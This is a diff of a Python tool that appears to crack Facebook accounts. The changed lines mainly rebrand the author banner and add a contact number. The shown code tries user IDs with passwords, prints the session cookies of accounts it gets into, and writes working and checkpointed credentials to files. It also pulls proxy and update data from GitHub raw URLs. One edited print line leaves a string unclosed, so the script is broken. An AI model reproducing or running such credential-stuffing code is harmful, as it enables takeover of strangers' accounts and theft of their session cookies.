@@ -1084,22 +1084,22 @@ for xd in range(10000):
     ugen.append(uaku2)
 
 logo = """
-\033[1;30m$$$$$$$\   $$$$$$\  $$$$$$$\   $$$$$$\  
-\033[1;31m$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ 
-\033[1;32m$$ |  $$ |$$ /  $$ |$$ |  $$ |$$ /  $$ |
-\033[1;33m$$ |  $$ |$$$$$$$$ |$$ |  $$ |$$$$$$$$ |
-\033[1;34m$$ |  $$ |$$  __$$ |$$ |  $$ |$$  __$$ |
-\033[1;35m$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |
-\033[1;36m$$$$$$$  |$$ |  $$ |$$$$$$$  |$$ |  $$ |
-\033[1;37m\_______/ \__|  \__|\_______/ \__|  \__|\033[1;32m ALONE😞🎭✌\033[1;37m 
+ \033[1;30m$$$$$$\ $$\     $$\  $$$$$$\  $$\   $$\ 
+ \033[1;31m$$  __$$\\$$\   $$  |$$  __$$\ $$$\  $$ |
+ \033[1;32m$$ /  $$ |\$$\ $$  / $$ /  $$ |$$$$\ $$ |
+ \033[1;33m$$$$$$$$ | \$$$$  /  $$$$$$$$ |$$ $$\$$ |
+ \033[1;34m$$  __$$ |  \$$  /   $$  __$$ |$$ \$$$$ |
+ \033[1;35m$$ |  $$ |   $$ |    $$ |  $$ |$$ |\$$$ |
+ \033[1;36m$$ |  $$ |   $$ |    $$ |  $$ |$$ | \$$ |
+ \033[1;37m\__|  \__|   \__|    \__|  \__|\__|  \__|\033[1;32m ARAIN🤟❤✌\033[1;37m 
 --------------------------------------------------
-[•] AUTHOR     : \033[1;32mDADAX\033[1;37m
-[•] GITHUB     : \033[1;32mDADAX-ALONE😞\033[1;37m
-[•] TOOL NAME  : \033[1;32mDADAX\033[1;37m
-[•] TOOL TYPE  : \033[1;32mRANDOM\033[1;37m
-[•] STATUS     : \033[1;32mFREE\033[1;37m
+[•] AUTHOR       : \033[1;31mAYAN\033[1;31m
+[•] CONTACT     : \033[1;33m+971564382087🙉\033[1;33m
+[•] TOOL NAME : \033[1;32mAYAN\033[1;32m
+[•] TOOL TYPE  : \033[1;34mRANDOM\033[1;34m
+[•] STATUS         : \033[1;35mFREE\033[1;35m
 --------------------------------------------------
-[•] \033[1;37mVERSION    :\033[1;32m 1.0.3 \033[1;37m"DON'T WORRY FOR UPDATES!"\033[1;37m
+[•] \033[1;37mVERSION    :\033[1;32m 1.2 \033[1;37m"DON'T WORRY FOR UPDATES!"\033[1;37m
 --------------------------------------------------"""
 
 def lines():
@@ -1108,7 +1108,7 @@ loop = 0
 oks = []
 cps = []
 try:
-    print('\n\033[1;37m[•] WAIT CHECKING FOR UPDATE')
+    print('\n\033[1;37m[•] JOIN MY WHATSAPPGROUP)
     proxy = requests.get('https://raw.githubusercontent.com/ALI-JUTT/Ahmed/main/update.txt').text.splitlines()
     v = 3.1
     update = requests.get('https://raw.githubusercontent.com/ALI-JUTT/files/main/version.txt').text
@@ -1490,21 +1490,21 @@ def fcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print('\033[1;32m[DADAX-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                print('\033[1;32m[AYAN-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                 open('RDX-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:152]
-                # print('\033[1;33m[DADAX-CP] '+uid+' | '+ps+'\x1b[1;97m')
+                # print('\033[1;33m[AYAN-CP] '+uid+' | '+ps+'\x1b[1;97m')
                 open('RDX-CP.txt', 'a').write(uid+' | '+ps+'\n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r[\033[1;97mALONE😞\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
+        sys.stdout.write(f'\r[\033[1;97mAYAN😞\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
